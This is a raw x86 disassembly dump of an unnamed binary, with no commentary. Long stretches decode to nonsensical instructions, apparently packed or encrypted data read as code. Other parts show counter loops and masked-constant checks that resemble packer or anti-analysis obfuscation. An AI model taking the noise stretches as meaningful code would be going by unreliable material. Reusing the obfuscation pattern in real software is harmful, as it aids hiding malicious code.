  404802:	or     ebp,DWORD PTR ds:0xe1d34f79
  404808:	das    
  404809:	xchg   esi,eax
  40480a:	mov    cl,BYTE PTR [edx+ebp*8-0x30]
  40480e:	cld    
  40480f:	call   0x939f:0x23aaed63
  404816:	jecxz  0x404835
  404818:	clc    
  404819:	xor    bh,0x68
  40481c:	mov    es,WORD PTR [ecx-0xc381d05]
  404822:	icebp  
  404823:	mov    edx,0x803a047
  404828:	mov    ebx,0x18b35807
  40482d:	mov    bl,bl
  40482f:	stos   DWORD PTR es:[edi],eax
  404830:	scas   al,BYTE PTR es:[edi]
  404831:	jl     0x4047e0
  404833:	rol    DWORD PTR gs:[edi-0x2c],cl
  404837:	ss stc 
  404839:	cmp    edx,DWORD PTR [edx]
  40483b:	loope  0x40482a
  40483d:	cdq    
  40483e:	ds dec eax
  404840:	outs   dx,DWORD PTR ds:[esi]
  404841:	mov    dh,0x9
  404843:	cld    
  404844:	pslld  mm2,QWORD PTR [ebp+0x1]
  404848:	jo     0x404877
  40484a:	in     eax,0xa2
  40484c:	in     eax,dx
  40484d:	cwde   
  40484e:	ins    BYTE PTR es:[di],dx
  404850:	dec    eax
  404851:	sub    eax,0x5d2a3d61
  404856:	sub    dh,dh
  404858:	lock sub ah,BYTE PTR [ebx]
  40485b:	push   edx
  40485c:	inc    ebp
  40485d:	mov    eax,ds:0x3ead382e
  404862:	loopne 0x404821
  404864:	cmp    eax,0x864c8bc
  404869:	dec    ebp
  40486a:	xor    al,0xac
  40486c:	jge    0x404881
  40486e:	je     0x4048ca
  404870:	mov    esi,0xc51d8f56
  404875:	jp     0x40487c
  404877:	call   FWORD PTR [ebx+0x80758be]
  40487d:	fcomp  st(3)
  40487f:	jns    0x4048ab
  404881:	iret   
  404882:	mov    ah,0x9a
  404884:	adc    DWORD PTR [edi-0x286352e7],esi
  40488a:	pusha  
  40488b:	ror    BYTE PTR [edx+0x5cf4202b],0xff
  404892:	imul   esi,DWORD PTR [esi-0x7d],0xffffffe3
  404896:	xlat   BYTE PTR ds:[ebx]
  404897:	dec    ecx
  404898:	lds    eax,FWORD PTR [ebx]
  40489a:	inc    edx
  40489b:	call   0x8ea24b7d
  4048a0:	(bad)  
  4048a2:	dec    esi
  4048a3:	pop    ebp
  4048a4:	or     eax,0xda15a56d
  4048a9:	and    BYTE PTR [eax-0x76016315],al
  4048af:	xor    esp,0x9af63aa6
  4048b5:	xchg   ebp,eax
  4048b6:	mov    ds:0x7cda96a1,al
  4048bb:	pushf  
  4048bc:	and    eax,DWORD PTR [edi]
  4048be:	push   ecx
  4048bf:	mov    ecx,0xda6299
  4048c4:	out    0xe6,al
  4048c6:	sub    DWORD PTR [edx-0x3f949152],esp
  4048cc:	cwde   
  4048cd:	outs   dx,DWORD PTR ds:[esi]
  4048ce:	add    BYTE PTR [ebx],dl
  4048d0:	cmp    eax,0xc06926a8
  4048d5:	cpuid  
  4048d7:	ret    0x411
  4048da:	jno    0x4048b5
  4048dc:	mov    bl,0x9e
  4048de:	aam    0x5d
  4048e0:	mov    ebp,0x3ef721c9
  4048e5:	add    ebx,0xdf2b5283
  4048eb:	jge    0x4048a2
  4048ed:	in     al,0xa0
  4048ef:	push   ds
  4048f0:	ror    bh,0x43
  4048f3:	jmp    0x835c7e42
  4048f8:	sub    DWORD PTR [edx+0x539633ce],0x30
  4048ff:	outs   dx,BYTE PTR ds:[esi]
  404900:	repnz dec edx
  404902:	fist   DWORD PTR [edi]
  404904:	dec    ebp
  404905:	xchg   ebx,eax
  404906:	fld    QWORD PTR [ecx+0xf]
  404909:	(bad)  
  40490a:	adc    DWORD PTR [eax-0x53],ecx
  40490d:	mov    ah,0x3f
  40490f:	cwde   
  404910:	es mov dl,0xf5
  404913:	std    
  404914:	lahf   
  404915:	or     BYTE PTR [edi+0x2c87fff5],al
  40491b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40491c:	jg     0x4048a9
  40491e:	mov    BYTE PTR [edx-0x40ebf30c],dl
  404924:	mov    fs,WORD PTR [ecx-0x2f]
  404927:	pop    ecx
  404928:	push   es
  404929:	rcr    DWORD PTR [edx-0x5d13a92d],1
  40492f:	jb     0x4048bd
  404931:	push   edi
  404932:	call   0xc55296c5
  404937:	stos   DWORD PTR es:[edi],eax
  404938:	inc    ebp
  404939:	push   es
  40493a:	xor    BYTE PTR [ebp-0x546a882a],ah
  404940:	pop    ebx
  404941:	(bad)  
  404942:	outs   dx,BYTE PTR ds:[esi]
  404943:	jmp    0x4049bf
  404945:	mov    bl,0x65
  404947:	push   edx
  404948:	add    eax,0xb162cbbd
  40494d:	or     BYTE PTR [esi+0x7c],ah
  404950:	jg     0x40495e
  404952:	pop    ebx
  404953:	fcomp  DWORD PTR [eax+eax*8-0x7]
  404957:	pusha  
  404958:	fsub   QWORD PTR [ecx+0x3b7ae1e9]
  40495e:	mov    ds:0x4d2c9d08,eax
  404963:	and    eax,DWORD PTR [esi+0x6ba8cf10]
  404969:	mov    ah,0xb
  40496b:	xor    dl,ah
  40496d:	fwait
  40496e:	push   es
  40496f:	dec    ebp
  404970:	add    al,0xd1
  404972:	(bad)  
  404973:	in     al,dx
  404974:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404975:	and    BYTE PTR [ecx+0x4b],dl
  404978:	or     ecx,DWORD PTR ss:[ecx-0x661da781]
  40497f:	arpl   di,di
  404981:	dec    ebx
  404982:	aad    0x9c
  404984:	add    BYTE PTR [ecx+0x4afeb3ed],cl
  40498a:	lock popa 
  40498c:	xor    dl,BYTE PTR [ebp-0x3dbf418d]
  404992:	pop    es
  404993:	mov    eax,0xd1674101
  404998:	retf   0xe407
  40499b:	xchg   BYTE PTR [edx+esi*4+0x74],bh
  40499f:	popf   
  4049a0:	fisttp DWORD PTR [eax]
  4049a2:	mov    dh,BYTE PTR gs:[ecx+0x4d4ff1f7]
  4049a9:	repz jb 0x404943
  4049ac:	aas    
  4049ad:	push   ebx
  4049ae:	pop    ebx
  4049af:	pop    ebx
  4049b0:	pop    ebp
  4049b1:	and    al,0x7d
  4049b3:	or     bh,BYTE PTR [ebp-0x3b]
  4049b6:	mov    ch,bl
  4049b8:	push   esi
  4049b9:	aas    
  4049ba:	mov    ds:0x30141455,al
  4049bf:	loop   0x4049b5
  4049c1:	cmp    DWORD PTR [esi-0x30],esi
  4049c4:	mov    ?,ebp
  4049c6:	test   al,al
  4049c8:	or     al,0x1f
  4049ca:	xchg   ebx,eax
  4049cb:	push   esi
  4049cc:	mov    ecx,0x785a266c
  4049d1:	sar    DWORD PTR ds:0x4e2245e5,0xe
  4049d8:	push   0xb
  4049da:	add    BYTE PTR [esi+0x40],dl
  4049dd:	(bad)  
  4049df:	adc    ah,BYTE PTR [esi]
  4049e1:	(bad)  
  4049e2:	pusha  
  4049e3:	jnp    0x4049cf
  4049e5:	xor    BYTE PTR [ecx-0x718a46fe],bl
  4049eb:	or     eax,0xc1dccdfc
  4049f0:	repnz or bh,dh
  4049f3:	imul   esp,DWORD PTR [edx-0x39],0x4
  4049f7:	adc    eax,0xdad2a884
  4049fc:	aad    0xc
  4049fe:	mov    ds:0xeddba3af,al
  404a03:	mov    eax,0xd3bc4888
  404a08:	fwait
  404a09:	cmp    al,0x2d
  404a0b:	sbb    eax,0xfcfc4218
  404a10:	(bad)  [edx-0x3e70eb74]
  404a16:	jo     0x4049f7
  404a18:	mov    esp,0x99311fe2
  404a1d:	xchg   edi,eax
  404a1e:	and    al,0xa1
  404a20:	stos   DWORD PTR es:[edi],eax
  404a21:	or     cl,BYTE PTR ds:0x5f20994a
  404a27:	cwde   
  404a28:	(bad)  [eax+0x453d8318]
  404a2e:	add    dl,bl
  404a30:	ficomp WORD PTR [edx-0x12218611]
  404a36:	out    0x6f,al
  404a38:	sub    ah,bl
  404a3a:	fisub  DWORD PTR [ebp-0x59]
  404a3d:	cmp    DWORD PTR [esi+0x7f],ebx
  404a40:	sbb    al,0x7b
  404a42:	sbb    ch,BYTE PTR [eax-0x3b]
  404a45:	or     cl,BYTE PTR [ecx]
  404a47:	imul   ebp,ebp,0xbb61d62a
  404a4d:	loopne 0x404a40
  404a4f:	test   eax,0xebe6316d
  404a54:	adc    dl,BYTE PTR [edi-0x50]
  404a57:	fstp   QWORD PTR [ebx]
  404a59:	lahf   
  404a5a:	mov    esp,0x146bb0e8
  404a5f:	out    0xe6,eax
  404a61:	ror    cl,0x38
  404a64:	dec    esi
  404a65:	dec    ebx
  404a66:	(bad)  
  404a68:	push   es
  404a69:	pop    edx
  404a6a:	pusha  
  404a6b:	push   esp
  404a6c:	push   edi
  404a6d:	stos   DWORD PTR es:[edi],eax
  404a6e:	jg     0x404acf
  404a70:	pop    esi
  404a71:	pop    ebx
  404a72:	leave  
  404a73:	ret    
  404a74:	push   ebp
  404a75:	mov    ebp,esp
  404a77:	sub    esp,0x2c
  404a7a:	leave  
  404a7b:	ret    0x10
  404a7e:	push   ebp
  404a7f:	mov    ebp,esp
  404a81:	sub    esp,0x44
  404a84:	adc    DWORD PTR ds:0x43383f,edi
  404a8a:	push   edi
  404a8b:	mov    eax,DWORD PTR [ebp+0xc]
  404a8e:	mov    edx,DWORD PTR ds:0x4337b7
  404a94:	and    DWORD PTR ds:0x433803,edx
  404a9a:	mov    DWORD PTR [ebp-0x10],eax
  404a9d:	adc    DWORD PTR ds:0x43372b,0x2679
  404aa7:	mov    eax,DWORD PTR [ebp+0x8]
  404aaa:	xor    ecx,DWORD PTR ds:0x43376b
  404ab0:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  404ab7:	mov    DWORD PTR ds:0x43382b,0x7030
  404ac1:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  404ac8:	and    DWORD PTR ds:0x4337c3,0x0
  404ad2:	mov    edi,DWORD PTR ds:0x4337c3
  404ad8:	inc    edi
  404ad9:	mov    DWORD PTR ds:0x4337c3,edi
  404adf:	cmp    DWORD PTR ds:0x4337c3,0x6
  404ae6:	jne    0x404af5
  404aec:	push   DWORD PTR [ebp-0x18]
  404aef:	call   DWORD PTR ds:0x412358
  404af5:	cmp    DWORD PTR ds:0x4337c3,0x5
  404afc:	jne    0x404b0f
  404b02:	mov    edi,DWORD PTR ds:0x4337c3
  404b08:	inc    edi
  404b09:	mov    DWORD PTR ds:0x4337c3,edi
  404b0f:	cmp    DWORD PTR ds:0x4337c3,0x14
  404b16:	jb     0x404ad2
  404b1c:	jmp    0x404e76
  404b21:	push   ecx
  404b22:	mov    esi,0xf1913591
  404b27:	jno    0x404b83
  404b29:	ins    DWORD PTR es:[edi],dx
  404b2a:	inc    ebp
  404b2b:	fild   WORD PTR [ecx+0x4ca55d1d]
  404b31:	xor    ebp,DWORD PTR ds:0x7d337e7e
  404b37:	jle    0x404bb7
  404b39:	inc    esi
  404b3a:	mov    cl,0xda
  404b3c:	cmp    ebx,edx
  404b3e:	aas    
  404b3f:	(bad)  
  404b40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b41:	fwait
  404b42:	inc    ebx
  404b43:	out    0xcc,al
  404b45:	inc    eax
  404b46:	cmp    BYTE PTR [ebx+0x5dda0dd0],0x8c
  404b4d:	xor    DWORD PTR [edi+0x78],0x12
  404b51:	repz pop edi
  404b53:	dec    edi
  404b54:	push   esi
  404b55:	push   esp
  404b56:	inc    eax
  404b57:	jmp    0xe9fb:0x3f76b63a
  404b5e:	inc    ecx
  404b5f:	pusha  
  404b60:	ds leave 
  404b62:	jl     0x404b60
  404b64:	inc    ebx
  404b65:	mov    ebx,esp
  404b67:	adc    cl,ah
  404b69:	push   edi
  404b6a:	icebp  
  404b6b:	loop   0x404b37
  404b6d:	sbb    esp,0xffffffde
  404b70:	xchg   edx,eax
  404b71:	xchg   eax,edx
  404b73:	push   ss
  404b74:	adc    eax,0x579805c1
  404b79:	xor    al,0x6c
  404b7b:	inc    eax
  404b7c:	ret    0x609c
  404b7f:	jno    0x404b84
  404b81:	mov    eax,ds:0xfe39f630
  404b86:	data16 aam 0x16
  404b89:	push   0xffffffd9
  404b8b:	jnp    0x404bec
  404b8d:	sbb    al,0x3e
  404b8f:	arpl   WORD PTR [esi+ebx*2+0x1b],ax
  404b93:	cmc    
  404b94:	and    esp,DWORD PTR [esi-0x5d9ac156]
  404b9a:	out    dx,eax
  404b9b:	sbb    BYTE PTR [edx-0x35f95da4],0x26
  404ba2:	add    al,0x6f
  404ba4:	cmp    dh,BYTE PTR [ebx]
  404ba6:	(bad)  
  404ba7:	cdq    
  404ba8:	adc    BYTE PTR [ecx+esi*8-0x2],ah
  404bac:	rol    BYTE PTR [ebx+edi*8],1
  404baf:	mov    dh,0xcb
  404bb1:	sbb    ah,BYTE PTR [ebp+0x3f5304a7]
  404bb7:	ja     0x404b8f
  404bb9:	or     al,BYTE PTR [eax]
  404bbb:	mov    al,ds:0xb1f4556d
  404bc0:	mov    ebx,0xed53a3b1
  404bc5:	cmp    BYTE PTR [eax],0xb0
  404bc8:	xchg   ecx,eax
  404bc9:	cmp    edi,DWORD PTR ds:0xdc5b7166
  404bcf:	xor    ebx,DWORD PTR [ebp-0x4]
  404bd2:	int3   
  404bd3:	or     BYTE PTR [edi-0x18b6993f],al
  404bd9:	and    BYTE PTR [eax-0x57],bl
  404bdc:	and    DWORD PTR [edx+0xd],ebx
  404bdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404be0:	mov    edx,0xb79f51a0
  404be5:	cmp    eax,0xb72f5e73
  404bea:	outs   dx,DWORD PTR ds:[esi]
  404beb:	mov    al,0x4e
  404bed:	mov    dl,0x1d
  404bef:	jg     0x404bfe
  404bf1:	ficomp DWORD PTR [esi]
  404bf3:	das    
  404bf4:	int    0xeb
  404bf6:	retf   0xeef7
  404bf9:	(bad)  
  404bfb:	xchg   ebx,ebp
  404bfd:	fmul   QWORD PTR [ebx-0x12]
  404c00:	mov    ebx,0xd922ee8a
  404c05:	sbb    BYTE PTR [edi+eax*2+0x1c],ah
  404c09:	mov    bl,0xbc
  404c0b:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c0d:	inc    esi
  404c0e:	outs   dx,DWORD PTR ds:[esi]
  404c0f:	dec    ecx
  404c10:	pop    ebx
  404c11:	test   BYTE PTR [ecx],bl
  404c13:	popf   
  404c14:	sub    DWORD PTR [ecx-0x57949765],eax
  404c1a:	adc    eax,0xa086a865
  404c1f:	test   al,0xc8
  404c21:	retf   
  404c22:	sahf   
  404c23:	popf   
  404c24:	ins    BYTE PTR es:[edi],dx
  404c25:	dec    ecx
  404c26:	daa    
  404c27:	adc    BYTE PTR [ecx+0x5e],al
  404c2a:	test   BYTE PTR [ecx-0x40],dl
  404c2d:	xchg   DWORD PTR [esi-0x6fed93d9],esi
  404c33:	adc    DWORD PTR [esi],edi
  404c35:	xor    al,0xd2
  404c37:	test   DWORD PTR [ecx+0x2a],eax
  404c3a:	xchg   ecx,eax
  404c3b:	mov    esi,0xbe5e3df
  404c40:	sub    BYTE PTR [edi+0x15043ea5],ch
  404c46:	jns    0x404c3f
  404c48:	sbb    esp,DWORD PTR [ecx-0x5ba92755]
  404c4e:	xchg   eax,ebx
  404c50:	out    dx,al
  404c51:	cwde   
  404c52:	push   cs
  404c53:	mov    ebx,0x15cd2bfd
  404c58:	popa   
  404c59:	in     al,0xb5
  404c5b:	test   al,0x90
  404c5d:	jae    0x404c24
  404c5f:	push   0xffffff8e
  404c61:	xor    eax,0x25c65fdf
  404c66:	ja     0x404c01
  404c68:	arpl   WORD PTR [edx],bx
  404c6a:	retf   0xdc3f
  404c6d:	loopne 0x404c38
  404c6f:	mov    WORD PTR [edx+edi*8],fs
  404c72:	sub    esi,DWORD PTR [esi-0x75]
  404c75:	rcl    BYTE PTR [ebp+0x58ca9ee1],cl
  404c7b:	es inc ebx
  404c7d:	inc    ebp
  404c7e:	outs   dx,DWORD PTR ds:[esi]
  404c7f:	inc    esi
  404c80:	bsf    ebx,DWORD PTR [eax]
  404c83:	in     al,dx
  404c84:	xchg   esp,eax
  404c85:	daa    
  404c86:	cmp    al,0xed
  404c88:	cwde   
  404c89:	sbb    BYTE PTR [ecx+ebp*4+0x4d75239e],bh
  404c90:	clc    
  404c91:	cdq    
  404c92:	push   cs
  404c93:	dec    ebx
  404c94:	aam    0x64
  404c96:	dec    eax
  404c97:	mov    ds:0xa4755f89,eax
  404c9c:	xchg   ecx,eax
  404c9d:	int3   
  404c9e:	push   esi
  404c9f:	xor    edi,eax
  404ca1:	mov    ds:0xe9b3058b,eax
  404ca6:	mov    edx,0xc5527e3e
  404cab:	cld    
  404cac:	in     al,dx
  404cad:	out    dx,eax
  404cae:	adc    dl,BYTE PTR [ebx+0x7a87678e]
  404cb4:	lods   eax,DWORD PTR ds:[esi]
  404cb5:	jne    0x404cdc
  404cb7:	cmp    edx,DWORD PTR [ebx]
  404cb9:	inc    esi
  404cba:	scas   eax,DWORD PTR es:[edi]
  404cbb:	sub    bh,cl
  404cbd:	push   esp
  404cbe:	jmp    0xe0175972
  404cc3:	out    dx,al
  404cc4:	jno    0x404cf1
  404cc6:	or     eax,0x8c58e961
  404ccb:	cmp    al,0xa0
  404ccd:	mov    ebx,0xd4a0b0fa
  404cd2:	add    DWORD PTR [ebp-0x16],0x62
  404cd6:	xor    edx,ebx
  404cd8:	idiv   BYTE PTR gs:[esi-0x2a]
  404cdc:	(bad)  
  404cdd:	inc    DWORD PTR [ebp-0x35f11e7d]
  404ce3:	jno    0x404c68
  404ce5:	mov    edx,0x4e6068a9
  404cea:	pop    edi
  404ceb:	pop    ds
  404cec:	inc    esi
  404ced:	pop    ebp
  404cee:	fdiv   DWORD PTR [ebp-0x49d7d3b1]
  404cf4:	push   ds
  404cf5:	push   ds
  404cf6:	jecxz  0x404cba
  404cf8:	sub    eax,0x769f7a5e
  404cfd:	mov    ch,0x5b
  404cff:	cld    
  404d00:	jbe    0x404d3c
  404d02:	dec    ebx
  404d03:	adc    cl,BYTE PTR [esi-0xf]
  404d06:	cli    
  404d07:	inc    ebx
  404d08:	cmp    BYTE PTR [ecx],ch
  404d0a:	push   0xffffffbb
  404d0c:	mov    ebp,?
  404d0e:	push   edi
  404d0f:	jl     0x404ccd
  404d11:	int    0x81
  404d13:	ins    BYTE PTR es:[edi],dx
  404d14:	push   edx
  404d15:	iret   
  404d16:	mov    ah,0x4a
  404d18:	push   esp
  404d19:	(bad)  
  404d1a:	jae    0x404d94
  404d1c:	int3   
  404d1d:	fcmovu st,st(5)
  404d1f:	pop    eax
  404d20:	inc    esp
  404d21:	xchg   ecx,eax
  404d22:	push   esi
  404d23:	shl    DWORD PTR [esi+0x191de775],cl
  404d29:	mov    esp,DWORD PTR [ebp-0x2]
  404d2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d2d:	aas    
  404d2e:	and    esi,DWORD PTR [esi]
  404d30:	scas   al,BYTE PTR es:[edi]
  404d31:	int3   
  404d32:	xchg   esi,eax
  404d33:	data16 cmc 
  404d35:	push   es
  404d36:	and    bh,ch
  404d38:	xor    ah,bh
  404d3a:	jno    0x404d53
  404d3c:	mov    ah,BYTE PTR [esp+eax*8-0x3d74faf0]
  404d43:	shl    DWORD PTR [eax-0x1af2209c],0x70
  404d4a:	nop
  404d4b:	call   0x5d81:0x2090cff9
  404d52:	pop    edi
  404d53:	inc    ecx
  404d54:	mov    eax,DWORD PTR [ebp-0x1ed37189]
  404d5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d5b:	jge    0x404d3f
  404d5d:	sub    eax,0xd0d21c0c
  404d62:	push   ss
  404d63:	mov    al,0x42
  404d65:	xchg   esp,eax
  404d66:	sub    ah,BYTE PTR ds:0xd0c27516
  404d6c:	push   ds
  404d6d:	and    DWORD PTR [eax-0x23],edx
  404d70:	mov    ecx,0x4ddeb089
  404d75:	loop   0x404d70
  404d77:	ficomp WORD PTR [esi+0x6dc3d25]
  404d7d:	add    al,0x1a
  404d7f:	data16 repnz into 
  404d82:	xor    al,0x3
  404d84:	(bad)
  404d87:	(bad)  
  404d88:	out    0xaf,eax
  404d8a:	dec    edi
  404d8b:	sub    al,cl
  404d8d:	push   es
  404d8e:	jmp    0x86f2f9d4
  404d93:	ja     0x404e0f
  404d95:	sahf   
  404d96:	iret   
  404d97:	aaa    
  404d98:	addr16 std 
  404d9a:	add    ah,cl
  404d9c:	bound  edi,QWORD PTR [ecx]
  404d9e:	push   cs
  404d9f:	push   esi
  404da0:	mov    ds:0xb1eb3b58,al
  404da6:	add    al,0xcb
  404da8:	or     BYTE PTR [edi+0x62],al
  404dab:	push   ecx
  404dac:	xchg   ebp,eax
  404dad:	lods   eax,DWORD PTR ds:[esi]
  404dae:	push   es
  404daf:	(bad)  
  404db0:	mov    esp,0x7f24afbf
  404db5:	mov    bh,0x67
  404db7:	retf   0x73c7
  404dba:	pusha  
  404dbb:	int3   
  404dbc:	adc    DWORD PTR [ebx-0x5a],ebx
  404dbf:	pop    es
  404dc0:	or     BYTE PTR ds:0xd0511ffa,dh
  404dc6:	(bad)  
  404dc7:	test   al,0x16
  404dc9:	ret    
  404dca:	mov    ebp,0x3f9eee83
  404dcf:	or     eax,DWORD PTR [ebp-0x69e67a63]
  404dd5:	inc    esp
  404dd6:	retf   
  404dd7:	test   eax,0xb4b93f78
  404ddc:	or     eax,0x1e859e6b
  404de1:	stos   DWORD PTR es:[edi],eax
  404de2:	adc    ch,ah
  404de4:	(bad)  
  404de5:	retf   0x625d
  404de8:	jg     0x404e5b
  404dea:	sbb    bh,BYTE PTR [eax+0x3d]
  404ded:	(bad)  
  404dee:	enter  0x5e2e,0xb
  404df2:	xor    DWORD PTR [ebp+0x63],esi
  404df5:	or     eax,0xea074b49
  404dfa:	mov    eax,ds:0x43697db2
  404dff:	pop    ebp
  404e00:	mov    al,BYTE PTR [esi+0x72090801]
  404e06:	retw   0xf1d0
  404e0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e0b:	stc    
  404e0c:	push   edx
  404e0d:	dec    esi
  404e0e:	mov    ebx,0x78815090
  404e13:	fild   WORD PTR [eax+eiz*2+0x68]
  404e17:	sub    BYTE PTR [esi+ebp*8-0xd],cl
  404e1b:	sbb    edi,DWORD PTR [edi]
  404e1d:	gs ins BYTE PTR es:[edi],dx
  404e1f:	cmp    BYTE PTR [ebp+0x71],0x7f
  404e23:	mov    al,0xf9
  404e25:	push   ds
  404e26:	mov    al,ds:0x3224c768
  404e2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e2c:	repnz push edi
  404e2e:	fiadd  WORD PTR [edx]
  404e30:	in     al,dx
  404e31:	xchg   BYTE PTR [edi],dh
  404e33:	push   0x1b456680
  404e38:	push   ss
  404e39:	ja     0x404e3d
  404e3b:	dec    esi
  404e3c:	fs stc 
  404e3e:	sbb    DWORD PTR [edi],edi
  404e40:	std    
  404e41:	sub    DWORD PTR [ecx],esp
  404e43:	xchg   ebp,eax
  404e44:	xor    al,0xc
  404e46:	fdivr  DWORD PTR [eax+0x1c]
  404e49:	mov    edx,0x986bb4c7
  404e4e:	dec    ebx
  404e4f:	mov    eax,0xb00decc
  404e54:	pusha  
  404e55:	bound  esi,QWORD PTR [edx+0x7bf81e91]
  404e5b:	adc    ebx,DWORD PTR [eax-0x4b]
  404e5e:	dec    ebx
  404e5f:	mov    edx,0x7cabc65
  404e64:	adc    BYTE PTR [edi+0x3d],0x17
  404e68:	mov    ecx,0x194496a5
  404e6d:	sbb    BYTE PTR [edx],0xb7
  404e70:	mov    esp,DWORD PTR [eax]
  404e72:	mov    eax,ds:0x8b668a78
  404e77:	push   ebp
  404e78:	or     BYTE PTR [ecx+0x7359d1],al
  404e7e:	add    BYTE PTR [ecx+0x54b8c045],cl
  404e84:	or     BYTE PTR [ecx+0x7],dl
  404e87:	xor    edx,eax
  404e89:	adc    DWORD PTR ds:0x43371b,0x3221
  404e93:	mov    ecx,0x32729b
  404e98:	mov    edi,DWORD PTR ds:0x4337e7
  404e9e:	adc    DWORD PTR ds:0x43377f,edi
  404ea4:	add    edx,ecx
  404ea6:	neg    edi
  404ea8:	mov    DWORD PTR [ebp-0x8],edx
  404eab:	mov    DWORD PTR ds:0x4337eb,0x10
  404eb5:	cmp    DWORD PTR ds:0x4337eb,0x0
  404ebc:	je     0x404f14
  404ec2:	cmp    DWORD PTR ds:0x4337eb,0x9
  404ec9:	jne    0x404ee2
  404ecf:	push   0x6f04
  404ed4:	push   0x5d47
  404ed9:	push   DWORD PTR [ebp-0x1c]
  404edc:	call   DWORD PTR ds:0x41235c
  404ee2:	cmp    DWORD PTR ds:0x4337eb,0xa
  404ee9:	jne    0x404efc
  404eef:	mov    edi,DWORD PTR ds:0x4337eb
  404ef5:	dec    edi
  404ef6:	mov    DWORD PTR ds:0x4337eb,edi
  404efc:	mov    edi,DWORD PTR ds:0x4337eb
  404f02:	dec    edi
  404f03:	mov    DWORD PTR ds:0x4337eb,edi
  404f09:	jmp    0x404eb5
  404f0e:	and    DWORD PTR ds:0x43383f,ecx
  404f14:	mov    edx,DWORD PTR [ebp+0x8]
  404f17:	sbb    edi,DWORD PTR ds:0x4337eb
  404f1d:	xor    edx,eax
  404f1f:	sbb    edi,DWORD PTR ds:0x4337bf
  404f25:	add    edx,ecx
  404f27:	and    DWORD PTR ds:0x43383b,0x0
  404f31:	xor    edi,edi
  404f33:	add    edi,DWORD PTR ds:0x43383b
  404f39:	inc    edi
  404f3a:	mov    DWORD PTR ds:0x43383b,edi
  404f40:	cmp    DWORD PTR ds:0x43383b,0xc
  404f47:	jne    0x404f58
  404f4d:	push   0x3fd8
  404f52:	call   DWORD PTR ds:0x412000
  404f58:	cmp    DWORD PTR ds:0x43383b,0xb
  404f5f:	jne    0x404f72
  404f65:	mov    edi,DWORD PTR ds:0x43383b
  404f6b:	inc    edi
  404f6c:	mov    DWORD PTR ds:0x43383b,edi
  404f72:	cmp    DWORD PTR ds:0x43383b,0x17
  404f79:	jb     0x404f31
  404f7f:	mov    DWORD PTR [ebp+0xc],edx
  404f82:	mov    DWORD PTR ds:0x433737,0x5f27
  404f8c:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  404f93:	xor    DWORD PTR ds:0x433767,edi
  404f99:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  404fa0:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  404fa7:	sbb    DWORD PTR ds:0x4337ef,edi
  404fad:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  404fb4:	adc    DWORD PTR ds:0x43370f,ecx
  404fba:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  404fc1:	movzx  edi,WORD PTR ds:0x433767
  404fc8:	and    DWORD PTR ds:0x433713,edi
  404fce:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  404fd5:	dec    edx
  404fd6:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  404fdd:	mov    edx,DWORD PTR [ebp+0x8]
  404fe0:	add    DWORD PTR ds:0x4337e7,ebx
  404fe6:	xor    edx,eax
  404fe8:	add    edi,0x469e
  404fee:	mov    edi,DWORD PTR [ebp-0x10]
  404ff1:	add    edx,ecx
  404ff3:	cmp    edi,edx
  404ff5:	mov    DWORD PTR ds:0x43382f,0x53a
  404fff:	je     0x40685f
  405005:	mov    DWORD PTR ds:0x433837,0x2c13
  40500f:	push   ebx
  405010:	mov    DWORD PTR ds:0x4337ef,0x2429
  40501a:	jmp    0x40683a
  40501f:	mov    edx,DWORD PTR [ebp-0x8]
  405022:	and    DWORD PTR ds:0x433727,0x0
  40502c:	mov    edi,DWORD PTR ds:0x433727
  405032:	inc    edi
  405033:	mov    DWORD PTR ds:0x433727,edi
  405039:	cmp    DWORD PTR ds:0x433727,0x6
  405040:	jne    0x40505d
  405046:	push   DWORD PTR [ebp-0x14]
  405049:	push   DWORD PTR [ebp-0x10]
  40504c:	push   DWORD PTR [ebp-0xc]
  40504f:	push   DWORD PTR [ebp-0x18]
  405052:	push   0x82f7
  405057:	call   DWORD PTR ds:0x41236c
  40505d:	cmp    DWORD PTR ds:0x433727,0x5
  405064:	jne    0x405079
  40506a:	xor    edi,edi
  40506c:	xor    edi,DWORD PTR ds:0x433727
  405072:	inc    edi
  405073:	mov    DWORD PTR ds:0x433727,edi
  405079:	cmp    DWORD PTR ds:0x433727,0x17
  405080:	jb     0x40502c
  405086:	xor    edi,edi
  405088:	add    edi,DWORD PTR ds:0x4337ff
  40508e:	add    DWORD PTR ds:0x4337bb,edi
  405094:	mov    edi,DWORD PTR [ebp-0x10]
  405097:	sub    edi,edx
  405099:	mov    edx,DWORD PTR [ebp-0x4]
  40509c:	xor    edx,eax
  40509e:	add    edx,ecx
  4050a0:	mov    DWORD PTR ds:0x4337eb,0x78fa
  4050aa:	cmp    edi,edx
  4050ac:	mov    DWORD PTR ds:0x43383b,0x49ec
  4050b6:	jb     0x40685e
  4050bc:	mov    edx,DWORD PTR [ebp-0x28]
  4050bf:	mov    edi,DWORD PTR [ebp-0x4]
  4050c2:	xor    edx,eax
  4050c4:	inc    DWORD PTR ds:0x43383b
  4050ca:	xor    edi,eax
  4050cc:	not    DWORD PTR ds:0x4337fb
  4050d2:	add    edi,ecx
  4050d4:	add    edx,ecx
  4050d6:	adc    ebx,0x69d8
  4050dc:	imul   edx,edi
  4050df:	mov    edi,DWORD PTR [ebp-0x8]
  4050e2:	mov    ebx,DWORD PTR [ebp-0x10]
  4050e5:	sbb    DWORD PTR ds:0x433727,0x4337b7
  4050ef:	sub    ebx,edi
  4050f1:	mov    DWORD PTR ds:0x43371f,0x4726
  4050fb:	cmp    ebx,edx
  4050fd:	mov    DWORD PTR ds:0x4337eb,0x2e42
